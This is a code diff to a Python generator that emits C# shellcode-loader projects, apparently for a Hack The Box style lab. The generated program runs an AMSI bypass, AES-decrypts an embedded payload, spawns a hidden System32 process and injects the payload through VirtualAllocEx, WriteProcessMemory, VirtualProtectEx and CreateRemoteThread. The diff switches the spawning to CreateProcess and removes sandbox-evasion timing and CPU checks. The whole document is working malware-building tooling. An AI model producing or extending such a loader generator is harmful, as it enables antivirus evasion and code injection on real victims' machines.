@@ -44,12 +44,9 @@ def _generate_inject_project(
     iv_field = plausible_field()
     result_var = plausible_field()
     sc_var = plausible_field()
-    proc_var = plausible_field()
-    handle_var = plausible_field()
     addr_var = plausible_field()
     old_protect_var = plausible_field()
     thread_var = plausible_field()
-    sleep_var = plausible_field()
 
     amsi_cls, amsi_method, reassemble_expr, _ = generate_standard_project_files(
         project_dir, encrypted_b64, key_b64, used
@@ -71,40 +68,41 @@ def _generate_inject_project(
 
     program_template = (
         "using System;\n"
-        "using System.Diagnostics;\n"
         "using System.Runtime.InteropServices;\n"
         "using System.Security.Cryptography;\n\n"
         "internal static class {mcls}\n"
         "{{\n"
         '    private static readonly string {kf} = "{kb}";\n'
         '    private static readonly string {ivf} = "{ivb}";\n\n'
+        "    [StructLayout(LayoutKind.Sequential)]\n"
+        "    struct STARTUPINFO {{ uint cb; IntPtr a,b,c;"
+        " uint d,e,f,g,h,i,j; ushort k,l; IntPtr m,n,o,p; }}\n\n"
+        "    [StructLayout(LayoutKind.Sequential)]\n"
+        "    struct PROCESS_INFORMATION {{"
+        " public IntPtr hProcess, hThread;"
+        " public int dwProcessId, dwThreadId; }}\n\n"
+        '    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]\n'
+        "    static extern bool CreateProcess(IntPtr app, string cmd,\n"
+        "        IntPtr pa, IntPtr ta, bool inh, uint flags,\n"
+        "        IntPtr env, IntPtr dir, ref STARTUPINFO si,\n"
+        "        out PROCESS_INFORMATION pi);\n"
         '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr OpenProcess(\n"
-        "        uint access, bool inherit, int pid);\n"
+        "    static extern IntPtr VirtualAllocEx(\n"
+        "        IntPtr h, IntPtr a, uint sz, uint t, uint p);\n"
         '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr VirtualAllocEx(\n"
-        "        IntPtr hProc, IntPtr addr, uint size, uint type, uint protect);\n"
+        "    static extern bool WriteProcessMemory(\n"
+        "        IntPtr h, IntPtr a, byte[] b, int sz, out IntPtr w);\n"
         '    [DllImport("kernel32.dll")]\n'
-        "    private static extern bool WriteProcessMemory(\n"
-        "        IntPtr hProc, IntPtr addr, byte[] buf, uint size, out UIntPtr written);\n"
+        "    static extern bool VirtualProtectEx(\n"
+        "        IntPtr h, IntPtr a, uint sz, uint np, out uint op);\n"
         '    [DllImport("kernel32.dll")]\n'
-        "    private static extern bool VirtualProtectEx(\n"
-        "        IntPtr hProc, IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);\n"
+        "    static extern IntPtr CreateRemoteThread(\n"
+        "        IntPtr h, IntPtr a, uint ss, IntPtr sa,\n"
+        "        IntPtr p, uint f, IntPtr tid);\n"
         '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr CreateRemoteThread(\n"
-        "        IntPtr hProc, IntPtr attr, uint stackSize, IntPtr startAddr,\n"
-        "        IntPtr param, uint flags, IntPtr threadId);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern uint WaitForSingleObject(IntPtr h, uint ms);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern bool CloseHandle(IntPtr h);\n\n"
+        "    static extern uint WaitForSingleObject(IntPtr h, uint ms);\n\n"
         "    private static void {em}()\n"
         "    {{\n"
-        # Sandbox checks
-        "        var {sv} = DateTime.Now;\n"
-        "        System.Threading.Thread.Sleep(1500);\n"
-        "        if ((DateTime.Now - {sv}).TotalMilliseconds < 1000) return;\n"
-        "        if (Environment.ProcessorCount < 2) return;\n\n"
         # AMSI bypass
         "        {ac}.{am}();\n\n"
         # Decrypt payload
@@ -119,35 +117,33 @@ def _generate_inject_project(
         "            var dec = aes.CreateDecryptor();\n"
         "            {scv} = dec.TransformFinalBlock({rv}, 0, {rv}.Length);\n"
         "        }}\n\n"
-        # Spawn target process
-        '        var {pv} = Process.Start(new ProcessStartInfo("{target}")\n'
-        "        {{\n"
-        "            WindowStyle = ProcessWindowStyle.Hidden\n"
-        "        }});\n"
-        "        if ({pv} == null) return;\n"
-        "        System.Threading.Thread.Sleep(500);\n\n"
-        # Open process
-        "        var {hv} = OpenProcess(0x001FFFFF, false, {pv}.Id);\n"
-        "        if ({hv} == IntPtr.Zero) return;\n\n"
+        # Spawn target process using CreateProcess (matching HTB approach)
+        "        var si = new STARTUPINFO();\n"
+        "        PROCESS_INFORMATION pi;\n"
+        "        CreateProcess(IntPtr.Zero,\n"
+        '            "C:\\\\Windows\\\\System32\\\\{target}",\n'
+        "            IntPtr.Zero, IntPtr.Zero, false,\n"
+        "            0x00000008 | 0x08000000,\n"
+        "            IntPtr.Zero, IntPtr.Zero, ref si, out pi);\n"
+        "        if (pi.hProcess == IntPtr.Zero) return;\n\n"
         # VirtualAllocEx (PAGE_READWRITE = 0x04)
         "        var {av} = VirtualAllocEx(\n"
-        "            {hv}, IntPtr.Zero, (uint){scv}.Length, 0x3000, 0x04);\n"
-        "        if ({av} == IntPtr.Zero) {{ CloseHandle({hv}); return; }}\n\n"
+        "            pi.hProcess, IntPtr.Zero, (uint){scv}.Length, 0x3000, 0x04);\n"
+        "        if ({av} == IntPtr.Zero) return;\n\n"
         # WriteProcessMemory
-        "        UIntPtr written;\n"
+        "        IntPtr written;\n"
         "        WriteProcessMemory(\n"
-        "            {hv}, {av}, {scv}, (uint){scv}.Length, out written);\n\n"
+        "            pi.hProcess, {av}, {scv}, {scv}.Length, out written);\n\n"
         # VirtualProtectEx (PAGE_EXECUTE_READ = 0x20)
         "        uint {opv};\n"
         "        VirtualProtectEx(\n"
-        "            {hv}, {av}, (UIntPtr){scv}.Length, 0x20, out {opv});\n\n"
+        "            pi.hProcess, {av}, (uint){scv}.Length, 0x20, out {opv});\n\n"
         # CreateRemoteThread
         "        var {tv} = CreateRemoteThread(\n"
-        "            {hv}, IntPtr.Zero, 0, {av},\n"
+        "            pi.hProcess, IntPtr.Zero, 0, {av},\n"
         "            IntPtr.Zero, 0, IntPtr.Zero);\n"
         "        if ({tv} != IntPtr.Zero)\n"
-        "            WaitForSingleObject({tv}, 0xFFFFFFFF);\n\n"
-        "        CloseHandle({hv});\n"
+        "            WaitForSingleObject({tv}, 0xFFFFFFFF);\n"
         "    }}\n\n"
         "    private static void Main() => {em}();\n"
         "}}\n"
@@ -159,15 +155,12 @@ def _generate_inject_project(
         ivf=iv_field,
         ivb=iv_b64,
         em=entry_method,
-        sv=sleep_var,
         ac=amsi_cls,
         am=amsi_method,
         rv=result_var,
         rae=reassemble_expr,
         scv=sc_var,
-        pv=proc_var,
         target=target_escaped,
-        hv=handle_var,
         av=addr_var,
         opv=old_protect_var,
         tv=thread_var,
